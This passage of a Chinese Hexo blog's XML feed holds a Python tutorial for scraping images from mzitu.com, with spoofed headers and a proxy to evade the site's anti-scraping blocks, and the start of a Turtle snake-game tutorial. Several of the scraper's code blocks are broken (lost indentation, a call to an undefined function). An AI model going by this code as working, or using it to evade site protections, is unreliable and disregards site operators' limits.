rel="noopener">https://gitee.com/hp256/saas_platform/tree/master</a></p>]]></content>
      
      
      <categories>
          
          <category> SaaS平台 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>妹子图片爬取</title>
      <link href="/2020/07/01/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%88%AC%E5%8F%96/"/>
      <url>/2020/07/01/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%88%AC%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="妹子图片爬取"><a href="#妹子图片爬取" class="headerlink" title="妹子图片爬取"></a>妹子图片爬取</h1><h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><p>目标网站：<a href="https://www.mzitu.com/" target="_blank" rel="noopener">https://www.mzitu.com/</a></p><p>选择要爬取的具体页面</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/1.jpg"  alt="1593581808(1)"></p><p>对网站进行检查（右键+检测，或者按F12），找到图片的url，以及下一页的url地址。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/2..jpg"  alt="2."></p><p>由于妹子图的每一页只有一张图片，需要获得每一页的url地址再获得每一页的图片地址。</p><p>通过上面的分析基本完成。</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>下载所需要的的库，例如：<code>requests</code>和<code>lxml</code>等</p><h3 id="构造请求头"><a href="#构造请求头" class="headerlink" title="构造请求头"></a>构造请求头</h3><p>该网站有反爬机制，需构造对应的请求头。</p><p>为了防止 ip 被该网站封禁还可以构造代理池。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.6 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'https://www.mzitu.com/'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">'http'</span>:<span class="string">'222.95.144.65:3000'</span>,</span><br><span class="line"><span class="string">'https'</span>:<span class="string">'222.95.144.65:3000'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取相关的数据"><a href="#获取相关的数据" class="headerlink" title="获取相关的数据"></a>获取相关的数据</h3><p>获取相关数据采用的Xpath语法进行获取，使用Xpath语法需引入lxml库。</p><h4 id="1-下载网页"><a href="#1-下载网页" class="headerlink" title="1.下载网页"></a>1.下载网页</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.6 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'https://www.mzitu.com/'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载网页</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(url)</span>:</span></span><br><span class="line">html = requests.get(url,headers=headers).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(html)</span><br><span class="line">    <span class="comment"># return html</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549/'</span></span><br><span class="line">get_html(url)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/3.jpg"  alt="3"></p><h4 id="2-获取页数"><a href="#2-获取页数" class="headerlink" title="2.获取页数"></a>2.获取页数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取页数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pages</span><span class="params">(html)</span>:</span></span><br><span class="line">    etree_html = etree.HTML(html)</span><br><span class="line">    pages = etree_html.xpath(<span class="string">"//div[@class='pagenavi']/a[5]/span/text()"</span>)</span><br><span class="line">    print(pages)</span><br><span class="line">    <span class="comment"># return pages</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549/'</span></span><br><span class="line">html = get_html(url)</span><br><span class="line">get_pages(html)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/4.png"  alt="4"></p><h4 id="3-获取图片地址"><a href="#3-获取图片地址" class="headerlink" title="3.获取图片地址"></a>3.获取图片地址</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取图片地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img_html</span><span class="params">(html)</span>:</span></span><br><span class="line">    etree_html = etree.HTML(html)</span><br><span class="line">    img_urls = etree_html.xpath(<span class="string">"//div[@class='main-image']/p/a/img/@src"</span>)</span><br><span class="line">    print(img_urls)</span><br><span class="line">    <span class="comment"># return img_urls</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549'</span></span><br><span class="line">html = get_html(url)</span><br><span class="line">img_html(html)</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/5.jpg"  alt="5"></p><h4 id="4-保存图片"><a href="#4-保存图片" class="headerlink" title="4.保存图片"></a>4.保存图片</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span><span class="params">(img_urls,page)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> img_url <span class="keyword">in</span> img_urls:</span><br><span class="line">        pattern = img_url.split(<span class="string">'.'</span>)<span class="comment"># split分割符</span></span><br><span class="line">        response = requests.get(img_url,headers=headers).content</span><br><span class="line">        print(<span class="string">'正在下载第&#123;&#125;张图片'</span>.format(page))</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'project\\'</span> + str(page) + <span class="string">'.'</span> + str(pattern[<span class="number">-1</span>]), <span class="string">'ab'</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(response)</span><br></pre></td></tr></table></figure><h4 id="5-主函数的书写"><a href="#5-主函数的书写" class="headerlink" title="5.主函数的书写"></a>5.主函数的书写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549'</span></span><br><span class="line">html = get_html(url)<span class="comment"># 下载网页</span></span><br><span class="line">pages = get_pages(html)<span class="comment"># 获取页数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,int(pages[<span class="number">0</span>])+<span class="number">1</span>):<span class="comment"># 通过for循环获得下一页的url地址</span></span><br><span class="line">urls = url + str(i)<span class="comment"># 拼接网页地址</span></span><br><span class="line">htmls = get_html(urls)<span class="comment"># 下载网页</span></span><br><span class="line">img_urls = img_url(htmls)<span class="comment"># 获取该网页图片地址</span></span><br><span class="line">time.sleep(<span class="number">1</span>)<span class="comment"># 延迟，防止被封ip</span></span><br><span class="line">save_img(img_urls,i)<span class="comment"># 保存图片</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%AC%94%E8%AE%B0/6.jpg"  alt="6"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.6 Safari/537.36'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'https://www.mzitu.com/'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#下载网页</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">(url)</span>:</span></span><br><span class="line">html = requests.get(url,headers=headers).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取页数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pages</span><span class="params">(html)</span>:</span></span><br><span class="line">    etree_html = etree.HTML(html)</span><br><span class="line">    pages = etree_html.xpath(<span class="string">"//div[@class='pagenavi']/a[5]/span/text()"</span>)</span><br><span class="line">    <span class="keyword">return</span> pages</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取图片地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img_html</span><span class="params">(html)</span>:</span></span><br><span class="line">    etree_html = etree.HTML(html)</span><br><span class="line">    img_urls = etree_html.xpath(<span class="string">"//div[@class='main-image']/p/a/img/@src"</span>)</span><br><span class="line">    <span class="keyword">return</span> img_urls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_img</span><span class="params">(img_urls,page)</span>:</span></span><br><span class="line"><span class="keyword">for</span> img_url <span class="keyword">in</span> img_urls:</span><br><span class="line">    pattern = img_url.split(<span class="string">'.'</span>)<span class="comment"># split分割符</span></span><br><span class="line">    <span class="comment"># print(pattern)</span></span><br><span class="line">    response = requests.get(img_url,headers=headers).content</span><br><span class="line">    <span class="comment"># print(response)</span></span><br><span class="line">    print(<span class="string">'正在下载第&#123;&#125;张图片'</span>.format(page))</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'project\\'</span> + str(page) + <span class="string">'.'</span> + str(pattern[<span class="number">-1</span>]), <span class="string">'ab'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(response)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">url = <span class="string">'https://www.mzitu.com/224549/'</span></span><br><span class="line">html = get_html(url)<span class="comment"># 下载网页</span></span><br><span class="line">pages = get_pages(html)<span class="comment"># 获取页数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,int(pages[<span class="number">0</span>])+<span class="number">1</span>):<span class="comment"># 通过for循环获得下一页的url地址</span></span><br><span class="line">urls = url + str(i)<span class="comment"># 拼接网页地址</span></span><br><span class="line">htmls = get_html(urls)</span><br><span class="line">img_urls = img_html(htmls)</span><br><span class="line">save_img(img_urls,i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python游戏之贪吃蛇</title>
      <link href="/2020/05/22/python%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87/"/>
      <url>/2020/05/22/python%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87/</url>
      
        <content type="html"><![CDATA[<h1 id="python之贪吃蛇"><a href="#python之贪吃蛇" class="headerlink" title="python之贪吃蛇"></a>python之贪吃蛇</h1><h2 id="了解Turtle库"><a href="#了解Turtle库" class="headerlink" title="了解Turtle库"></a>了解Turtle库</h2><p>制作贪吃蛇先绘制图像，绘制图像引用的是Turtle库。</p><p>Turtle库是Python语言内置的库，想象画笔为小乌龟，在横轴x轴和纵轴y轴的坐标原点上，按某个指令在坐标平面图上爬行绘制图像。</p><h3 id="1-画布"><a href="#1-画布" class="headerlink" title="1.画布"></a>1.画布</h3><p>画布是Turtle用于绘图的区域，可以设置它的初始位置及画布大小。</p><p>语法格式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>turtle.screensize(canvwidth=<span class="literal">None</span>, canvheight=<span class="literal">None</span>, bg=<span class="literal">None</span>)</span><br><span class="line"><span class="comment">#canvwidth:画布的宽度(像素)</span></span><br><span class="line"><span class="comment">#canvheight:画布的高度(像素)</span></span><br><span class="line"><span class="comment">#bg:画布的背景颜色</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>turtle.setup(width=<span class="number">420</span>,height=<span class="number">420</span>,startx=<span class="literal">None</span>,starty=<span class="literal">None</span>)</span><br><span class="line"><span class="comment">#width：画布的宽度(像素)</span></span><br><span class="line"><span class="comment">#height：画布的高度(像素)</span></span><br><span class="line"><span class="comment">#(startx,starty)：矩形窗口左上角顶点的位置</span></span><br></pre></td></tr></table></figure><h3 id="2-画笔"><a href="#2-画笔" class="headerlink" title="2.画笔"></a>2.画笔</h3><h4 id="2-1画笔的状态"><a href="#2-1画笔的状态" class="headerlink" title="2.1画笔的状态"></a>2.1画笔的状态</h4><p>在画布上，小乌龟是以画布的中心为原点坐标。小乌龟的方向是朝着x轴的正放向。</p><h4 id="2-2画笔的属性"><a href="#2-2画笔的属性" class="headerlink" title="2.2画笔的属性"></a>2.2画笔的属性</h4><p>设置画笔的线宽：<code>turtle.pensize()</code></p><p>设置画笔的颜色：<code>turtle.pencolor()</code></p><p>设置画笔的移动速度：<code>turtle.speed(speed)</code>,画笔的速度范围在[0,10]整数。</p><h4 id="2-3绘制命令"><a href="#2-3绘制命令" class="headerlink" title="2.3绘制命令"></a>2.3绘制命令</h4><h5 id="画笔的运动命令"><a href="#画笔的运动命令" class="headerlink" title="画笔的运动命令"></a>画笔的运动命令</h5><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>turtle.forward(distance)</td><td>向当前画笔方向移动distance像素长度</td></tr><tr><td>turtle.backward(distance)</td><td>向当前画笔相反方向移动distance像素长度</td></tr><tr><td>turtle.right(degree)</td><td>顺时针移动degree°</td></tr><tr><td>turtle.left(degree)</td><td>逆时针移动degree°</td></tr><tr><td>turtle.pendown()</td><td>移动时绘制图形，缺省时也为绘制</td></tr><tr><td>turtle.goto(x,y)</td><td>将画笔移动到坐标为x,y的位置</td></tr><tr><td>turtle.penup()</td><td>提起笔移动，不绘制图形，用于另起一个地方绘制</td></tr><tr><td>turtle.circle()</td><td>画圆，半径为正(负)，表示圆心在画笔的左边(右边)画圆</td></tr><tr><td>setx( )</td><td>将当前x轴移动到指定位置</td></tr><tr><td>sety( )</td><td>将当前y轴移动到指定位置</td></tr><tr><td>setheading(angle)</td><td>设置当前朝向为angle角度</td></tr><tr><td>home()</td><td>设置当前画笔位置为原点，朝向东。</td></tr><tr><td>dot(r)</td><td>绘制一个指定直径和颜色的圆点</td></tr></tbody></table><h5 id="画笔的控制命令"><a href="#画笔的控制命令" class="headerlink" title="画笔的控制命令"></a>画笔的控制命令</h5><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>turtle.fillcolor(colorstring)</td><td>绘制图形的填充颜色</td></tr><tr><td>turtle.color(color1, color2)</td><td>同时设置pencolor=color1, fillcolor=color2</td></tr><tr><td>turtle.filling()</td><td>返回当前是否在填充状态</td></tr><tr><td>turtle.begin_fill()</td><td>准备开始填充图形</td></tr><tr><td>turtle.end_fill()</td><td>填充完成</td></tr><tr><td>turtle.hideturtle()</td><td>隐藏画笔的turtle形状</td></tr><tr><td>turtle.showturtle()</td><td>显示画笔的turtle形状</td></tr></tbody></table><h5 id="画笔的全局控制命令"><a href="#画笔的全局控制命令" class="headerlink" title="画笔的全局控制命令"></a>画笔的全局控制命令</h5><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>turtle.clear()</td><td>清空turtle窗口，但是turtle的位置和状态不会改变</td></tr><tr><td>turtle.reset()</td><td>清空窗口，重置turtle状态为起始状态</td></tr><tr><td>turtle.undo()</td><td>撤销上一个turtle动作</td></tr><tr><td>turtle.isvisible()</td><td>返回当前turtle是否可见</td></tr><tr><td>stamp()</td><td>复制当前图形</td></tr><tr><td>turtle.write(s [,font=(“font-name”,font_size,”font_type”)])</td><td>写文本，s为文本内容，font是字体的参数，分别为字体名称，大小和类型；font为可选项，font参数也是可选项</td></tr></tbody></table><h5 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h5><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>turtle.mainloop()或turtle.done()</td><td>启动事件循环 -调用Tkinter的mainloop函数。必须是乌龟图形程序中的最后一个语句。</td></tr><tr><td>turtle.delay(delay=None)</td><td>设置或返回以毫秒为单位的绘图延迟。</td></tr><tr><td>turtle.begin_poly()</td><td>开始记录多边形的顶点。当前的乌龟位置是多边形的第一个顶点。</td></tr><tr><td>turtle.end_poly()</td><td>停止记录多边形的顶点。当前的乌龟位置是多边形的最后一个顶点。将与第一个顶点相连。</td></tr><tr><td>turtle.get_poly()</td><td>返回最后记录的多边形。</td></tr></tbody></table><h2 id="贪吃蛇的绘制"><a href="#贪吃蛇的绘制" class="headerlink" title="贪吃蛇的绘制"></a>贪吃蛇的绘制</h2><p>了解Turtle库之后开始绘制贪吃蛇的框架</p><h3 id="绘制画布大小"><a href="#绘制画布大小" class="headerlink" title="绘制画布大小"></a>绘制画布大小</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="通用模块"><a href="#通用模块" class="headerlink" title="通用模块"></a>通用模块</h3><p>由于苹果与蛇都需要绘制，为了避免代码的冗余，编写一个模块gamebase.py文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="comment">#(x,y)小乌龟的起始坐标,side边长，color_name填充的颜色</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square</span><span class="params">(x,y,side,color_name)</span>:</span></span><br><span class="line">    turtle.up()                 <span class="comment">#抬起画笔</span></span><br><span class="line">    turtle.goto(x,y)            <span class="comment">#移动到(x,y)</span></span><br><span class="line">    turtle.down()               <span class="comment">#放下画笔</span></span><br><span class="line">    turtle.color(color_name)    <span class="comment">#设置画笔颜色</span></span><br><span class="line">    turtle.begin_fill()         <span class="comment">#开始填充图形</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#矩形的绘制</span></span><br><span class="line">    turtle.forward(side)        <span class="comment">#向当前画笔方向移动size像素长度</span></span><br><span class="line">    turtle.left(<span class="number">90</span>)             <span class="comment">#逆时针移动90°</span></span><br><span class="line">    turtle.forward(side)</span><br><span class="line">    turtle.left(<span class="number">90</span>)</span><br><span class="line">    turtle.forward(side)</span><br><span class="line">    turtle.left(<span class="number">90</span>)</span><br><span class="line">    turtle.forward(side)</span><br><span class="line">    turtle.left(<span class="number">90</span>)</span><br><span class="line"></span><br><span class="line">    turtle.end_fill()           <span class="comment">#填充完成</span></span><br></pre></td></tr></table></figure><h3 id="苹果的绘制"><a href="#苹果的绘制" class="headerlink" title="苹果的绘制"></a>苹果的绘制</h3><p>引用通用模块绘制苹果，由于苹果的出现位置是随机的，引用random库中的randrange</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"></span><br><span class="line"><span class="comment">#画布大小为420*420，因此x轴在(-210,210)，去除边框大小x轴为(200,20)</span></span><br><span class="line">apple_x = randrange(<span class="number">-20</span>,<span class="number">20</span>)*<span class="number">10</span></span><br><span class="line">apple_y = randrange(<span class="number">-20</span>,<span class="number">20</span>)*<span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_apple</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> apple_x,apple_y</span><br><span class="line">    square(apple_x, apple_y, <span class="number">10</span>, <span class="string">"red"</span>)</span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    game_loop_apple()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E8%B4%AA%E5%90%83%E8%9B%87/11.jpg"  alt="11"></p><h3 id="蛇的绘制"><a href="#蛇的绘制" class="headerlink" title="蛇的绘制"></a>蛇的绘制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">from</span> gamebase <span class="keyword">import</span> square</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置蛇一开始的位置</span></span><br><span class="line">snake = [[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">10</span>,<span class="number">0</span>],[<span class="number">20</span>,<span class="number">0</span>],[<span class="number">30</span>,<span class="number">0</span>],[<span class="number">40</span>,<span class="number">0</span>],[<span class="number">50</span>,<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game_loop_snake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(len(snake)):</span><br><span class="line">        square(snake[n][<span class="number">0</span>], snake[n][<span class="number">1</span>], <span class="number">10</span>, <span class="string">"black"</span>)</span><br><span class="line">    turtle.update()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    turtle.setup(<span class="number">420</span>,<span class="number">420</span>,<span class="number">0</span>,<span class="number">0</span>)   <span class="comment">#画布大小为420*420 px</span></span><br><span class="line">    turtle.hideturtle()            <span class="comment">#隐藏画笔的turtle形状</span></span><br><span class="line">    turtle.tracer(<span class="literal">False</span>)           <span class="comment">#取消画图延迟，之间显示画图的结果</span></span><br><span class="line">    game_loop_snake()</span><br><span class="line">    turtle.done()                  <span class="comment">#启动事件循环，停留画布</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/%E8%B4%AA%E5%90%83%E8%9B%87/12.jpg"  alt="12"></p><h3 